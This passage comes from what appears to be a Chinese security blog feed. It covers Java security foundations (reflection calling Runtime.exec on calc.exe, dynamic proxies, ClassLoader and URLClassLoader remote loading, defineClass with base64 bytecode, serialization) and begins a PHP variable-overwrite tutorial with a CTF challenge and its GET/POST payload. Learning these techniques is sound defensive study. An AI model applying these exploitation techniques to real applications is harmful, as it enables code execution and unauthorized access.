class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrainDB</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TrainDB <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">TrainDB</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 建立连接的代码...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 <code>getInstance</code>获取这个对象，避免建立多个数据库连接。</p><p>Runtime类就是单例模式，我们可以通过 <code>Runtime.getRuntime()</code> 来获取 <code>Runtime</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>这里用到了<code>getMethod</code> 和 <code>invoke</code> 方法，也是下面的主要内容</p><h3 id="反射调用类方法"><a href="#反射调用类方法" class="headerlink" title="反射调用类方法"></a>反射调用类方法</h3><p><strong>获取当前类指定的成员方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取Runtime的exec(String cmd)方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br></code></pre></td></tr></table></figure><p><code>getMethod</code> 和 <code>getDeclaredMethod</code> 都能狗获取到类成员方法，区别在于<code>getMethod</code>只能获取当前类和父类的所有有权限的方法，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法（包括private方法）</p><p>Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用<code>getMethod</code>的时候，我们需要传给它需要获取函数的参数列表，例如这里的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br></code></pre></td></tr></table></figure><p><strong>反射调用方法</strong></p><p>获取到 <code>java.lang.reflect.Method</code> 对象以后我们可以通过 <code>Method</code> 的 <code>invoke</code>方法来调用类方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">method.<span class="hljs-built_in">invoke</span>(方法实例对象, 方法参数值, 多个参数值)<br></code></pre></td></tr></table></figure><p><code>method.invoke</code>的第一个参数必须是类实例对象，如果调用的是<code>static</code>方法，那么第一个参数值可以传<code>null</code>，因为在Java中调用静态方法是不需要有类实例的，可以直接通过<code>类名.方法名(参数)</code>的方式调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br><br><span class="hljs-comment">// 获取Runtime的exec(String cmd)方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br><span class="hljs-comment">// 调用exec方法，等价于 rt.exec(cmd);</span><br>runtimeMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="反射调用成员变量"><a href="#反射调用成员变量" class="headerlink" title="反射调用成员变量"></a>反射调用成员变量</h3><p>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。</p><p><strong>获取当前类指定的成员变量</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Field</span> <span class="hljs-built_in">field</span> = clazz.getDecalaredField(<span class="hljs-string">&quot;变量名&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>getField</code>和<code>getDeclaredField</code>的区别同<code>getMethod</code>和<code>getDeclaredMethod</code></p><p><strong>获取成员变量值</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Object obj <span class="hljs-operator">=</span> field.get(类实例对象)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>修改成员变量值</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">field</span>.<span class="hljs-built_in">set</span>(类实例对象, 修改后的值);<br></code></pre></td></tr></table></figure><p>当我们没有修改成员变量的权限时可以使用 <code>field.setAccessable(true)</code> 的方式修改访问变量的访问权限。</p><h2 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h2><p>动态代理比较常见的用处：<strong>在不修改类的源码的情况下，通过代理的方式为类的方法提供更多的功能</strong></p><p>例如开发实现了业务部分的代码，忽然我们期望在这些业务代码中多添加日志记录功能的时候，一个一个类去添加代码很麻烦，这个时候就可以通过动态代理的方式对期待添加日志的类进行代理。</p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>Work接口需要实现work函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Work</span>&#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">work</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Teacher类实现了Work接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Work</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">work</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;teach students&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>WorkHandler用来处理被代理的对象，它必须继承InvocationHandler接口，并实现invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-comment">// 代理类中的真实对象</span><br>    <span class="hljs-keyword">private</span> Object obj;<br>    <span class="hljs-comment">// 构造函数，给真实对象赋值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WorkHandler</span><span class="hljs-params">(Object obj)</span>&#123;<br>        <span class="hljs-built_in">this</span>.obj = obj;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable&#123;<br>        <span class="hljs-comment">// 在真实对象执行之前我们可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;before invoke...&quot;</span>);<br>        <span class="hljs-comment">// java反射,用来调用obj对象的method方法,传入参数为args</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> method.invoke(obj, args);<br>        <span class="hljs-comment">// 在真实对象执行后我们可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;after invoke...&quot;</span>);<br>        <span class="hljs-keyword">return</span> invoke;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在ExampleProxy类中通过<code>Proxy.newProxyInstance</code>进行动态代理，这样当我们调用代理对象proxy对象的work方法的时候，<strong>实际上调用的是WorkHandler的invoke方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">// 要代理的真实对象</span><br>        <span class="hljs-type">Work</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br>        <span class="hljs-comment">// 代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理陈旭会调用真实对象的方法</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WorkHandler</span>(people);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 通过Proxy类的newProxyInstance方法创建代理对象</span><br><span class="hljs-comment">        * 参数一: handler.getClass().getClassLoader() 使用handler对象的classloader对象来加载我们的代理对象</span><br><span class="hljs-comment">        * 参数二: people.getClass().getInterfaces() 为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口的所有方法</span><br><span class="hljs-comment">        * 参数三: handler 将代理对象关联到上面的InvocationHandler对象上</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Work</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Work) Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);<br>        System.out.println(proxy.work());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行输出：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">before</span></span> invoke...<br>teach students<br><span class="hljs-function"><span class="hljs-title">after</span></span> invoke...<br></code></pre></td></tr></table></figure><p>在没有改变Teacher类的前提下通过代理Work接口，实现了work函数调用的重写。</p><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>Java是一个依赖与JVM实现的跨平台的开发语言。Java程序在运行前需要先编译成 Class文件，Java类加载初始化的时候会调用 <code>java.lang.ClassLoader</code> 加载类字节码，<code>ClassLoader</code> 会调用JVM的native方法来实现一个<code>java.lang.Class</code>实例</p><p>一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p><strong>ClassLoader 类核心方法：</strong></p><ol><li>loadClass（加载指定的Java类）</li><li>findClass（查找指定的Java类）</li><li>findLoadedClass（查找JVM已经加载过的类）</li><li>defineClass（定义一个Java类）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ClassLoader加载TestHelloWorld示例</span><br><span class="hljs-built_in">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;ysoserial.test.TestHelloWorld&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code> 提供了加载远程资源的能力，在写漏洞利用的时候我们可以使用这个特征来远程加载jar实现远程类方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;;<br><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>c.newInstance();<br></code></pre></td></tr></table></figure><p>放置好 <code>http://localhost:8000/Hello.class</code>，程序会请求<code>/Hello.class</code>文件，并执行文件中的字节码。</p><h3 id="利用defineClass直接加载字节码"><a href="#利用defineClass直接加载字节码" class="headerlink" title="利用defineClass直接加载字节码"></a>利用defineClass直接加载字节码</h3><p>不管是加载远程class文件还是本地的class或jar文件，Java都经过了三个方法调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassLoader#loadClass =&gt; ClassLoader#findClass =&gt; ClassLoader#defineClass<br></code></pre></td></tr></table></figure><p><code>loadClass</code>：从已加载的类缓存、父加载器等位置寻找类，在没有找到的情况下，执行<code>findClass</code></p><p><code>findClass</code>：根据基于URL指定的方式来加载类的字节码，可以是本地文件系统、jar包或远程服务器，读取字节码后交给<code>defineClass</code></p><p><code>defineClass</code>：处理前面传入的字节码，返回一个Java类</p><p>我们可以直接使用defineClass加载字节码，获取一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleClassLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行输出：Hello World</p><p>系统的<code>ClassLoader#defineClass</code>是一个保护属性，我们无法直接在外部访问，只能通过反射来调用。现实场景中，因为defineClass方法作用域是不开放的，我们很难利用。但它成为了常用攻击链<code>TemplatesImpl</code>的基础。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><strong>Java对象序列化</strong>指的是将一个Java类实例序列化成字节数组，用于存储对象实例化信息（类成员变量和属性值）。<strong>Java反序列化</strong>可以将序列化后的二进制数组转换未对应的Java类实例。</p><p>反序列化对象时有这些限制：</p><ol><li>被反序列化的类必须存在</li><li><code>serialVersionUID</code>值必须一致</li><li>实现了Serializable接口</li></ol><p><strong>反序列化类对象时不会调用该类构造方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-comment">// 创建ExampleSerialize类，并类设置属性值</span><br>        <span class="hljs-type">ExampleSerialize</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExampleSerialize</span>();<br>        t.setUsername(<span class="hljs-string">&quot;aurey&quot;</span>);<br><br>        <span class="hljs-comment">// 创建Java对象序列化输出流对象</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br><br>        <span class="hljs-comment">// 序列化ExampleSerialize类</span><br>        out.writeObject(t);<br>        out.close();<br><br>        <span class="hljs-comment">// 打印ExampleSerialize类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址</span><br>        System.out.println(<span class="hljs-string">&quot;ExampleSerialize类序列化后的字节数组:&quot;</span> + Arrays.toString(baos.toByteArray()));<br><br>        <span class="hljs-comment">// 利用ExampleSerialize类生成的二进制数组创建二进制输入流对象用于反序列化操作</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br><br>        <span class="hljs-comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br><br>        <span class="hljs-comment">// 反序列化输入流数据为ExampleSerialize对象</span><br>        <span class="hljs-type">ExampleSerialize</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (ExampleSerialize) in.readObject();<br>        System.out.println(<span class="hljs-string">&quot;用户名:&quot;</span> + test.getUsername());<br><br>        <span class="hljs-comment">// 关闭ObjectInputStream输入流</span><br>        in.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 序列化ExampleSerialize类</span><br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>out.writeObject(t);<br><br><span class="hljs-comment">// 反序列化输入流数据为ExampleSerialize对象</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br><span class="hljs-type">ExampleSerialize</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (ExampleSerialize) in.readObject();<br></code></pre></td></tr></table></figure><p>使用<code>ObjectOutputStream</code>类的<code>writeObject()</code>方法序列化<code>ExampleSerialize</code>类</p><p>使用<code>ObjectInputStream</code>类的<code>readObject()</code>方法反序列化<code>ExampleSerialize</code>类</p><p>在进行序列化的时，我们会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法。</p><p><strong>参考：</strong></p><p><a href="https://javasec.org/">https://javasec.org/</a></p><p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p><p><a href="https://www.freebuf.com/articles/web/214096.html">https://www.freebuf.com/articles/web/214096.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP变量覆盖</title>
    <link href="/2023/02/02/php_var_overrides/"/>
    <url>/2023/02/02/php_var_overrides/</url>
    
    <content type="html"><![CDATA[<p>通常将可以用自定义的参数替换原有变量值的情况称为变量覆盖漏洞。</p><p>经常导致变量覆盖漏洞的场景由：</p><ol><li>$$ 使用不当</li><li>extract() 使用不当</li><li>parse_str() 使用不当</li><li>开启全局变量注册 //PHP 5.3.0 后废弃</li></ol><h2 id="PHP变量覆盖"><a href="#PHP变量覆盖" class="headerlink" title="PHP变量覆盖"></a>PHP变量覆盖</h2><h3 id="使用不当"><a href="#使用不当" class="headerlink" title="$$ 使用不当"></a>$$ 使用不当</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$_403</span> = <span class="hljs-string">&quot;Access Denied&quot;</span>;<br><span class="hljs-variable">$_200</span> = <span class="hljs-string">&quot;Welcome Admin&quot;</span>;<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] != <span class="hljs-string">&quot;POST&quot;</span>)<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;BugsBunnyCTF is here :p…&quot;</span>);<br><span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]) )<br>     <span class="hljs-keyword">die</span>(<span class="hljs-variable">$_403</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>     <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>     <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>] !== <span class="hljs-variable">$flag</span> )<br>     <span class="hljs-keyword">die</span>(<span class="hljs-variable">$_403</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your flag : &quot;</span>. <span class="hljs-variable">$flag</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$_200</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>两个 foreach 中都使用了$$，这里就可以使用flag覆盖$_200</p><p>POST flag 等于任何值都可以通过15行的判断</p><p>Payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> DATA：?<span class="hljs-attribute">_200</span>=flag <br>POST DATA：<span class="hljs-attribute">flag</span>=anything<br></code></pre></td></tr></table></figure><h3 id="extract-使用不当"><a href="#extract-使用不当" class="headerlink" title="extract() 使用不当"></a>extract() 使用不当</h3><p><strong>extract()</strong>：将<strong>键和值</strong>注册成<strong>变量和值</strong></p><p>EXTR_PREFIX_SAME设置是如果变量冲突，就加上后面的前缀也就是dup，所以变量a不变，产生新的变量dup_a被赋值为cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Original&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ 